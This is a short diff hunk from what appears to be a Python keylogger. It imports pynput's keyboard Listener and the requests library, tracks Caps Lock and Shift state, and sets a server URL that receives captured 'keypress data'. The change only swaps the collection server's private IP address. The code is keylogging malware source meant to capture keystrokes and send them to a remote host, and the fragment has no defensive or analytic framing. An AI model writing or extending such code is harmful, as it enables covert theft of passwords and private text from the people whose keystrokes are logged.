@@ -2,7 +2,7 @@ import requests
 from pynput.keyboard import Listener, Key
 
 # URL of the local Flask server where you want to send keypress data
-ADMIN_SERVER_URL = 'http://192.168.146.1:5000/log'  # Change this to your server's IP address
+ADMIN_SERVER_URL = 'http://192.168.236.186:5000/log'  # Change this to your server's IP address
 
 # Track the state of Caps Lock and Shift keys
 caps = False
